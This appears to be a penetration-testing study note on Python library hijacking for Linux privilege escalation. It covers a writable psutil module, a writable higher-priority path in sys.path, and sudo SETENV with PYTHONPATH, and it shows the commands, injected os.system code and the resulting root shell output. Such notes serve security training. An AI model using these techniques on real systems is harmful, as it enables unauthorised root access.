## 1. Wrong Write Permissions
#### Python script
```shell
ls -l mem_status.py

-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py
```
#### Contents 
```python
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```

We see that the script uses the psutil module to execute the virtual_memory() method.
#### Module Permissions
```shell
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
```

```shell
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```
We have write permission on the module !
#### Module Content
```python
...SNIP...

def virtual_memory():

	...SNIP...
	
    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```
#### Module Contents - Hijacking
```python
...SNIP...

def virtual_memory():

	...SNIP...
	#### Hijacking
	import os
	os.system('id')
	

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...
```

---
## 2. Library Path
#### PATH Listing
```shell
python3 -c 'import sys; print("\n".join(sys.path))'

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```
To be able to use this variant, two prerequisites are necessary.
1. The module that is imported by the script is located under one of the lower priority paths listed via the `PYTHONPATH` variable.
2. We must have write permissions to one of the paths having a higher priority on the list.

Take the same exemple as above with `import psutil`
#### Locate package
```shell
pip3 show psutil

Location: /usr/local/lib/python3.8/dist-packages
```
So we have to found one writable PYTHONPATH above this and it's a win.
#### Find writable PATH
```shell
ls -la /usr/lib/python3.8

total 4916
drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
```
Found!
#### Hijack PATH
```python
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```

Place it in the writable PATH and execute:
```shell
sudo /usr/bin/python3 mem_status.py

uid=0(root) gid=0(root) groups=0(root)
```

---
## PYTHONPATH Environment Variable
`PYTHONPATH` is an environment variable that indicates what directory (or directories) Python can search for modules to import.
#### Checking sudo permissions
```shell
sudo -l

...
(ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
```
As we can see from the example, we are allowed to run `/usr/bin/python3` under the trusted permissions of `sudo` and are therefore allowed to set environment variables for use with this binary by the `SETENV:` flag being set.
#### Privilege Escalation using PYTHONPATH Environment Variable
Write a malicious module in /tmp
```shell
sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
```